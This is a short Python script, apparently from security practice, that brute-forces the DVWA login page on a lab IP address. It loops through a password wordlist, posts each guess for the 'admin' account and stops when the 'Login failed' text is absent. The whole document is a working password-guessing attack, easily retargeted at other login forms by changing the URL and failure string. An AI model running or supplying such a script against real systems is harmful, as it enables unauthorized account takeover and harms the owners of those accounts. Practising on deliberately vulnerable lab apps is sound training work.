import requests

target_url = "http://192.168.175.140/dvwa/login.php"
data_dic = {"username":"admin", "password":"password", "Login":"submit"}

with open("passwordlist.txt", "r") as passwordlist: #change the list path to a password wordlist
    for password in passwordlist:
        password = password.strip()
        data_dic["password"] = password
        response = requests.post(target_url, data=data_dic)
        if "Login failed" not in response.content:
            print("[+] Got the password -->" + password)
            exit()

print("[+] Reach the end of the list")
